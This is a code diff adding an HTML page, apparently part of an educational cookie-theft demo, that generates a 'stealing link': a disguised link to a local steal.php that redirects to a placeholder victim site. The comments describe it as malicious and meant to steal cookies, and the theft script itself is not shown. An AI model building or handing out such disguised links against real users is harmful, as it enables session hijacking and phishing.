@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generate Stealing Link</title>
+</head>
+<body>
+    <h2>Generate a Stealing Link (For Educational Purposes Only)</h2>
+    <button id="generateLink">Generate Stealing Link</button>
+    <p id="stealingLink"></p>
+
+    <script>
+        document.getElementById('generateLink').addEventListener('click', function() {
+            var stealingURL = "http://localhost/legaltest/steal.php"; // Adjust to your local server path
+            var victimURL = encodeURIComponent("http://victim.com");
+            
+            // Malicious link that appears normal but steals cookies
+            var maliciousLink = stealingURL + "?redirect=" + victimURL;
+            
+            document.getElementById('stealingLink').innerHTML = 
+                '<a href="' + maliciousLink + '" target="_blank">Click this link</a>';
+        });
+    </script>
+</body>
+</html>
